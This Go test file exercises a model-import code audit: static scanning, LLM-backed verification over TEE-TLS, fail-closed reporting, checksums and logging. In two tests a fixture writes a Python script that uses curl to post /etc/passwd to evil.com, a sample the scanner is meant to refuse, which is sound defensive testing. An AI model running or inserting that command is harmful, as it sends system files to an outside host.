package controller

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io/fs"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/CipherSlinger/teellm"
	"github.com/CipherSlinger/teetls"
	"taa/internal/codeaudit"
)

// treeEntry is one file's identity in a package snapshot: its path relative to
// the snapshot root, its size, and a digest of its bytes.
type treeEntry struct {
	path   string
	size   int64
	digest string
}

// snapshotTree records every file under dir as a path-sorted list of
// (relative path, size, content digest). Directories are not recorded: a
// directory carries no content of its own, so the file entries are what
// discriminate, and recording directories would add nothing. The digest is what
// makes the comparison a statement about content rather than about names.
func snapshotTree(t *testing.T, dir string) []treeEntry {
	t.Helper()
	var entries []treeEntry
	err := filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(dir, path)
		if err != nil {
			return err
		}
		sum := sha256.Sum256(data)
		entries = append(entries, treeEntry{path: rel, size: int64(len(data)), digest: hex.EncodeToString(sum[:])})
		return nil
	})
	if err != nil {
		t.Fatalf("snapshot %s: %v", dir, err)
	}
	sort.Slice(entries, func(i, j int) bool { return entries[i].path < entries[j].path })
	return entries
}

// TestFailedAuditLeavesTheImportedPackageUntouched pins the rule the audit is
// under: it reads, it judges, it reports, and it changes nothing. The failure it
// guards is not hypothetical - the audit gate used to call cleanDirContents on
// the model directory whenever the verdict was not a pass, so a false positive
// did not just refuse an import, it destroyed the artifact the operator had
// uploaded.
//
// The whole tree is compared, not one path: "we only deleted the checkpoints"
// is the same defect with a smaller blast radius, and the dependency libraries a
// model package bundles live in that same tree.
func TestFailedAuditLeavesTheImportedPackageUntouched(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	// The same shape the neighbouring static-fail test uses for a non-passing
	// verdict: a source file the static scan refuses.
	code := `import subprocess
subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
`
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}
	// A bundled dependency library, so the comparison also covers a file no
	// code path has any reason to rewrite.
	if err := os.WriteFile(filepath.Join(modelDir, "libnative.so"), []byte("\x7fELF native dependency\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.DockerID = "docker-test"

	before := snapshotTree(t, modelDir)
	passed := state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
	if passed {
		t.Fatal("fixture is wrong: this package is supposed to fail the audit")
	}
	after := snapshotTree(t, modelDir)
	if !reflect.DeepEqual(before, after) {
		t.Errorf("the audit changed the package it audited:\n before: %v\n after: %v", before, after)
	}
}

func TestLLMAvailable(t *testing.T) {
	ready := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/tags":
			_, _ = w.Write([]byte(`{"models":[{"name":"qwen2.5-coder:0.5b"}]}`))
		case "/api/generate":
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte(`{"response":"pong"}`))
		default:
			t.Fatalf("unexpected path = %s", r.URL.Path)
		}
	}))
	defer ready.Close()

	if !llmAvailable(ready.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = false, want true for ready server")
	}
	if llmAvailable(ready.URL, "nonexistent-model") {
		t.Fatal("llmAvailable = true, want false for missing model")
	}

	corruptModel := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/tags":
			_, _ = w.Write([]byte(`{"models":[{"name":"qwen2.5-coder:0.5b"}]}`))
		case "/api/generate":
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = w.Write([]byte(`{"error":"tensor offset exceeds file size"}`))
		default:
			http.NotFound(w, r)
		}
	}))
	defer corruptModel.Close()
	if llmAvailable(corruptModel.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for corrupt model generate failure")
	}

	down := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer down.Close()
	if llmAvailable(down.URL, "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for 500 response")
	}

	if llmAvailable("", "qwen2.5-coder:0.5b") {
		t.Fatal("llmAvailable = true, want false for empty endpoint")
	}
}

// TestLLMAvailableSurvivesAColdModelLoad pins the property both readiness probes
// need: the generate probe is not a ping, it makes the daemon load the model, so
// a daemon that answers tags at once but generate in seconds is a healthy daemon.
// Budgeting the probe like a ping reports the opposite - and because the cutoff
// cancels the load it was waiting on, retrying does not recover.
func TestLLMAvailableSurvivesAColdModelLoad(t *testing.T) {
	const coldLoad = 5 * time.Second

	cold := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/tags":
			_, _ = w.Write([]byte(`{"models":[{"name":"qwen2.5-coder:0.5b"}]}`))
		case "/api/generate":
			select {
			case <-time.After(coldLoad):
				_, _ = w.Write([]byte(`{"response":"pong"}`))
			case <-r.Context().Done():
			}
		default:
			http.NotFound(w, r)
		}
	}))
	defer cold.Close()

	if !llmAvailable(cold.URL, "qwen2.5-coder:0.5b") {
		t.Fatalf("llmAvailable = false for a daemon whose model takes %s to load", coldLoad)
	}
}

type healthCheckFailureLLMClient struct {
	deadline time.Time
	err      error
}

func (c *healthCheckFailureLLMClient) VerifyFinding(context.Context, *teellm.RequestEnvelope) (*teellm.ResponseEnvelope, error) {
	return nil, nil
}

func (c *healthCheckFailureLLMClient) HealthCheck(ctx context.Context) error {
	c.deadline, _ = ctx.Deadline()
	return c.err
}

func (c *healthCheckFailureLLMClient) Close() error {
	return nil
}

func TestIsLLMServiceAvailable_TimeoutAndErrorLog(t *testing.T) {
	const endpoint = "https://127.0.0.1:8443"
	const model = "qwen2.5-coder:3b"
	sentinelErr := errors.New("TEE-TLS health check failed")
	client := &healthCheckFailureLLMClient{err: sentinelErr}

	var logs bytes.Buffer
	previousOutput := log.Writer()
	log.SetOutput(&logs)
	defer log.SetOutput(previousOutput)

	startedAt := time.Now()
	if isLLMServiceAvailable(client, endpoint, model) {
		t.Fatal("isLLMServiceAvailable = true, want false")
	}

	if client.deadline.IsZero() {
		t.Fatal("HealthCheck context did not include a deadline")
	}
	deadlineDuration := client.deadline.Sub(startedAt)
	// The budget is the client's health budget, not an ordinary request timeout:
	// the probe has to outlast a cold model load. Asserted against the constant
	// rather than a literal so the two cannot drift apart.
	if deadlineDuration < auditLLMHealthCheckTimeout-time.Second || deadlineDuration > auditLLMHealthCheckTimeout+time.Second {
		t.Fatalf("health-check deadline duration = %s, want approximately %s", deadlineDuration, auditLLMHealthCheckTimeout)
	}
	// Budgeting the probe like an ordinary request is the defect this guards:
	// it cuts a cold model load off mid-load, and the cutoff cancels the load.
	if auditLLMHealthCheckTimeout <= 30*time.Second {
		t.Fatalf("health-check budget = %s, budgeted like an ordinary request", auditLLMHealthCheckTimeout)
	}

	logText := logs.String()
	for _, expected := range []string{endpoint, model, "timeout=" + auditLLMHealthCheckTimeout.String(), sentinelErr.Error()} {
		if !strings.Contains(logText, expected) {
			t.Errorf("health-check log missing %q: %s", expected, logText)
		}
	}
}

type mockControllerLLMBackend struct {
	healthy bool
}

func (m *mockControllerLLMBackend) HandleVerifyFinding(ctx context.Context, req *teellm.RequestEnvelope) (*teellm.ResponseEnvelope, error) {
	return &teellm.ResponseEnvelope{
		ProtocolVersion: teellm.CurrentProtocolVersion,
		RequestID:       req.RequestID,
		Status:          teellm.StatusSuccess,
		Decision: &teellm.DecisionResult{
			Verdict: teellm.VerdictBenign,
		},
	}, nil
}

func (m *mockControllerLLMBackend) HandleHealthCheck(ctx context.Context) error {
	if !m.healthy {
		return errors.New("backend unhealthy")
	}
	return nil
}

func TestIsLLMServiceAvailable_TEETLS(t *testing.T) {
	mockProv := teetls.NewMockEvidenceProvider()
	tlsCfg := &teetls.Config{
		Mode:             teetls.ModePermissive,
		EvidenceProvider: mockProv,
	}

	backend := &mockControllerLLMBackend{healthy: true}
	server, err := teellm.NewServer(teellm.ServerConfig{
		Addr:    "127.0.0.1:0",
		TEETLS:  tlsCfg,
		Backend: backend,
	})
	if err != nil {
		t.Fatalf("failed to create teellm server: %v", err)
	}
	defer server.Close()

	go func() {
		_ = server.Start()
	}()
	time.Sleep(50 * time.Millisecond)

	cfg := codeaudit.LLMConfig{
		Enabled:            true,
		Transport:          "teetls",
		Endpoint:           "https://" + server.Addr(),
		Model:              "qwen2.5-coder:3b",
		InsecureSkipVerify: true,
		AttestationMode:    "permissive",
	}

	client := newLLMClient(cfg)
	if client == nil {
		t.Fatal("expected newLLMClient to return non-nil client")
	}

	if !isLLMServiceAvailable(client, cfg.Endpoint, cfg.Model) {
		t.Fatal("expected isLLMServiceAvailable = true for healthy TEE-TLS server")
	}

	// Now make backend unhealthy
	backend.healthy = false
	if isLLMServiceAvailable(client, cfg.Endpoint, cfg.Model) {
		t.Fatal("expected isLLMServiceAvailable = false for unhealthy backend")
	}
}

func TestAuditAndReportModelImportFailClosed(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte("import torch\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// 模拟 LLM 服务不可用（返回 500）。
	llmDown := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer llmDown.Close()

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: true, Endpoint: llmDown.URL, Model: "qwen2.5-coder:0.5b", FailClosed: true}
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 2 {
			t.Fatalf("code = %d, want 2 (fail-closed)", rr.Code)
		}
		if rr.Msg == nil || !strings.Contains(*rr.Msg, "fail-closed") {
			t.Fatalf("msg = %v, want fail-closed message", rr.Msg)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportAudit (fail-closed)")
	}
}

func TestAuditAndReportModelImportStaticFail(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := `import subprocess
subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
`
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 1 {
			t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
		}
		if rr.Report == "" {
			t.Fatal("report empty, want audit JSON")
		}
		var audit codeaudit.AuditReport
		if err := json.Unmarshal([]byte(rr.Report), &audit); err != nil {
			t.Fatalf("report is not valid audit JSON: %v", err)
		}
		if audit.Conclusion.Passed {
			t.Fatal("conclusion.passed = true, want false")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportAudit (static fail)")
	}
}

func TestAuditAndReportModelImportStaticPass(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false} // 仅静态扫描
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"

	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Report == "" {
			t.Fatal("report empty, want audit JSON")
		}
		var audit codeaudit.AuditReport
		if err := json.Unmarshal([]byte(rr.Report), &audit); err != nil {
			t.Fatalf("report is not valid audit JSON: %v", err)
		}
		if !audit.Conclusion.Passed {
			t.Fatalf("conclusion.passed = false, want true")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for reportAudit (static pass)")
	}
}

func TestAuditAndReportModelImportIncludesChecksum(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportModelImportEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"
	state.setModelChecksum(map[string]any{
		"size":      int64(9999),
		"algorithm": "sm3",
		"value":     "sm3-model-hash-12345",
	})

	state.reportModelImportAsync("req-1", "task-1", 0, "模型导入成功")

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Checksum == nil {
			t.Fatalf("expected Checksum to be included in reportModelImport, got nil")
		}
		if rr.Checksum["algorithm"] != "sm3" || rr.Checksum["value"] != "sm3-model-hash-12345" || int64(rr.Checksum["size"].(float64)) != 9999 {
			t.Fatalf("unexpected checksum: %+v", rr.Checksum)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportModelImport")
	}
}

func TestAuditAndReportModelImportFallbackDirectoryChecksum(t *testing.T) {
	state, _ := setupTestState(t)
	modelDir := t.TempDir()
	code := "import torch\nimport torch.nn as nn\nmodel = nn.Linear(10, 2)\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(code), 0o644); err != nil {
		t.Fatal(err)
	}

	received := make(chan reportRequest, 1)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportModelImportEndpoint {
			return
		}
		var rr reportRequest
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	state.Security.ScanEnabled = true
	state.Security.ModelDir = modelDir
	state.PlatformIP = platform.URL
	state.DockerID = "docker-test"
	// ModelChecksum is nil, should fallback to calculating directory checksum

	state.reportModelImportAsync("req-1", "task-1", 0, "模型导入成功")

	select {
	case rr := <-received:
		if rr.Code != 0 {
			t.Fatalf("code = %d, want 0", rr.Code)
		}
		if rr.Checksum == nil {
			t.Fatalf("expected Checksum to be calculated from modelDir and included, got nil")
		}
		if rr.Checksum["algorithm"] != "sm3" {
			t.Fatalf("checksum algorithm = %v, want sm3", rr.Checksum["algorithm"])
		}
		if rr.Checksum["value"] == "" || rr.Checksum["value"] == "N/A" {
			t.Fatalf("checksum value is empty or N/A: %+v", rr.Checksum)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for reportModelImport")
	}
}

// namedEngine is a StaticEngine whose name the test chooses while the scanning
// stays the real baseline engine's. The assertion below is about where the logged
// name comes from, not about which engine scans better: a double that answers
// "semgrep" to Name() separates "the log prints the configured engine" from "the
// log prints a constant" without making this test depend on a semgrep binary. It
// does not pretend to scan the way semgrep does, and nothing here reads a finding
// it produced.
type namedEngine struct {
	codeaudit.StaticEngine
	name string
}

func (e namedEngine) Name() string { return e.name }

// TestAuditStartLogNamesTheEngine pins that the audit-start line says which Tier 1
// engine is about to scan. That line is what an operator reads to attribute a
// blocked import, and "the audit ran" stopped being enough once two engines
// became selectable: a report that proves which engine produced it is only useful
// if the log the operator is looking at names the same one.
//
// The second case is the one that keeps the line honest. A state can be built
// without an engine, and the log is written before the audit's own nil check, so
// an unguarded Name() call would turn a configuration error into a panic inside
// the audit path — the failure the fail-closed design exists to avoid.
func TestAuditStartLogNamesTheEngine(t *testing.T) {
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer platform.Close()

	for _, tc := range []struct {
		name   string
		engine codeaudit.StaticEngine
		want   string
	}{
		{"the configured engine", namedEngine{StaticEngine: codeaudit.DefaultEngine(), name: "semgrep"}, "engine=semgrep"},
		{"no engine configured", nil, "engine=unset"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			state, _ := setupTestState(t)
			modelDir := t.TempDir()
			if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte("import torch\n"), 0o644); err != nil {
				t.Fatal(err)
			}

			state.Security.ScanEnabled = true
			state.Security.Engine = tc.engine
			state.Security.ModelDir = modelDir
			state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
			state.PlatformIP = platform.URL
			state.DockerID = "docker-test"

			state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})

			var startLine string
			for _, entry := range state.Logs.All() {
				if strings.Contains(entry.Message, "开始模型代码审计") {
					startLine = entry.Message
					break
				}
			}
			if startLine == "" {
				t.Fatalf("no audit-start line among %d log entries", len(state.Logs.All()))
			}
			if !strings.Contains(startLine, tc.want) {
				t.Errorf("audit-start line = %q, want it to contain %q", startLine, tc.want)
			}
		})
	}
}
